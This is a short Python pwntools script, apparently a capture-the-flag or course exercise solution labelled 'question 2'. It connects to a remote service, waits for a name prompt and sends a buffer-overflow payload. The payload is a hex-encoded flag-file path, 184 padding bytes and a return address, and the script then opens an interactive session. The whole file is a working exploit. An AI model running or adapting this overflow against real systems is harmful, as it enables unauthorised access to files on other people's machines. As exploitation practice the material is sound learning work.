#!/usr/bin/env python


from pwn import *

context(arch = 'i386', os = 'linux')

# question 2
conn = remote('140.115.53.13',11000)


#receive from remote machine, until the "What's your name" 

conn.recvuntil("What's your name ?")

# /home/bssof/flag
filepath = "\x2f\x68\x6f\x6d\x65\x2f\x62\x73\x73\x6f\x66\x2f\x66\x6c\x61\x67"

bufaddr = "\x60\xa0\x04\x08"

payload = filepath + '\x00'*184 + bufaddr + '\n';

conn.send(payload)

conn.interactive()
